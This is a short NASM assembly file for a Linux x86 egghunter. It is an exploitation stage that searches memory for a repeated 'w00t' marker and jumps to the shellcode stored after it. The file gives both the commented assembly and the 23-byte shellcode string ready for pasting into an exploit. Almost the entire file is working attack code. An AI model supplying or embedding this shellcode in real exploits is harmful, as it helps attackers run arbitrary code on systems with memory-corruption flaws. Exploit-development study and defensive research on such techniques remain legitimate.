; Filename: small-egghunter.nasm
; Author:   Re4son <re4son [at] whitedome.com.au>
; Website:  http://www.whitedome.com.au/re4son
;
; Purpose: Linux x86 egghunter for searching allocated 
;          memory regions only
;          23 Bytes
;
; "\xeb\x10\x59\xb8\x77\x30\x30\x74\x89\xcf\xaf\xe0\xfb\xaf\xe0\xf8\xff\xe7\xe8\xeb\xff\xff\xff"

global _start            

section .text

_start:

 jmp short call_next			; start with jmp, call, pop routine

next:
  pop ecx
  mov		eax,0x74303077		; w00t

loop:
  mov 		edi,ecx
  scasd					; edi + 4, cmp mem content with exa
  loopnz  	loop            	; jmp back if no match, dec ecx
  scasd
  loopnz  	loop            	; jmp back if no match, dec ecx
  jmp 		edi             	; execute shellcode

call_next:
  call next				; get our start address

